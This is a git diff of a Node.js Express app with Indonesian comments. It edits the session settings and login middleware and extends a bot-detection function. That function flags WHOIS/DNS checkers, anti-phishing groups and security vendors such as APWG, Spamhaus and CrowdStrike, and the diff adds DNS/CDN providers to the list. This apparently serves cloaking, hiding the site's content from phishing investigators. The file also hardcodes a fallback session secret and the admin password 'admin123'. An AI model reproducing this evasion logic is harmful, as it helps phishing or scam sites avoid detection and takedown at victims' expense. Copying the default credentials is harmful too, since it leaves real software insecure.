@@ -9,22 +9,13 @@ const useragent = require('express-useragent');
 const axios = require('axios');
 const { randomInt } = require('crypto');
 
-
 const app = express();
-
-// Middleware dan route Anda di sini...
-
-// ... semua konfigurasi dan routing
-
-const PORT = process.env.PORT || 3001;
-
-
-
+const PORT = process.env.PORT || 3000;
 
 // Konfigurasi Session
 app.use(session({
     secret: process.env.SESSION_SECRET || '8f5d3243ccdd907092db55a28e3c1ea89293385adc0953f337ec9c974cc5522f',
-    resave: true,
+    resave: false,
     saveUninitialized: true,
     cookie: { 
         secure: process.env.NODE_ENV === 'production',
@@ -88,14 +79,12 @@ initDatabase();
 const PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
 
 // Authentication Middleware
-// Ganti middleware checkAuth menjadi:
 const checkAuth = (req, res, next) => {
-    const publicRoutes = ['/login', '/auth', '/logout', '/public', '/:slug'];
-    if (publicRoutes.includes(req.path) || req.path.startsWith('/public')) {
+    if (req.path === '/login' || req.path === '/auth' || req.path === '/logout') {
         return next();
     }
     
-    if (req.session.authenticated) {
+    if (req.session && req.session.authenticated) {
         return next();
     }
     
@@ -691,17 +680,18 @@ function isRequestFromBot(req) {
     }
 
     // Additional WHOIS/DNS specific checks
-    const whoisDnsPatterns = [
-        'whois', 'rdap', 'domain', 'dns', 'nameserver',
-        'ns-check', 'zone-check', 'tld-verify'
-    ];
+    // Additional WHOIS/DNS specific checks
+   const whoisDnsPatterns = [
+    'whois', 'rdap', 'domain', 'dns', 'nameserver',
+    'ns-check', 'zone-check', 'tld-verify'
+];
 
-    const isWhoisDnsCheck = whoisDnsPatterns.some(pattern => 
-        userAgent.includes(pattern) ||
-        req.path.includes(pattern) ||
-        req.query.hasOwnProperty('whois') ||
-        req.query.hasOwnProperty('dns')
-    );
+   const isWhoisDnsCheck = whoisDnsPatterns.some(pattern => 
+    userAgent.includes(pattern) ||
+    req.path.includes(pattern) ||
+    ('whois' in req.query) ||
+    ('dns' in req.query)
+);
 
     if (isWhoisDnsCheck) {
         return true;
@@ -709,13 +699,23 @@ function isRequestFromBot(req) {
     
     // Anti-Phishing Communities
     const antiPhishingCommunities = [
-        'apwg', 'anti-phishing', 'phish-report', 'phishlabs',
-        'cybercrime-tracker', 'abuseipdb', 'malware-hunter',
-        'spamhaus', 'surbl', 'uribl', 'dshield', 'shadowserver',
-        'team-cymru', 'threatstop', 'threatcrowd', 'alienvault',
-        'talosintelligence', 'fireeye', 'crowdstrike', 'paloalto',
-        'proofpoint-threat', 'cyren', 'f-secure-labs', 'kaspersky-lab'
-    ];
+    'apwg', 'anti-phishing', 'phish-report', 'phishlabs',
+    'cybercrime-tracker', 'abuseipdb', 'malware-hunter',
+    'spamhaus', 'surbl', 'uribl', 'dshield', 'shadowserver',
+    'team-cymru', 'threatstop', 'threatcrowd', 'alienvault',
+    'talosintelligence', 'fireeye', 'crowdstrike', 'paloalto',
+    'proofpoint-threat', 'cyren', 'f-secure-labs', 'kaspersky-lab'
+];
+
+// Domain and DNS Providers
+const domainDnsProviders = [
+    'cloudflare', 'akamai', 'fastly', 'aws route 53', 'google domains',
+    'godaddy dns', 'namecheap dns', 'dyn', 'dnsmadeeasy', 'zerigo',
+    'ns1', 'ultradns', 'azure dns', 'cloudns', 'he.net', 'linode dns',
+    'digitalocean dns', 'vultr dns', 'ovh dns', 'alibaba cloud dns',
+    'rackspace dns', 'softlayer dns', 'verisign dns', 'neustar dns',
+    'dnsimple', 'pointdns', 'constellix', 'nsone', 'edgedns'
+];
     
     // Common bot patterns
     const botPatterns = [
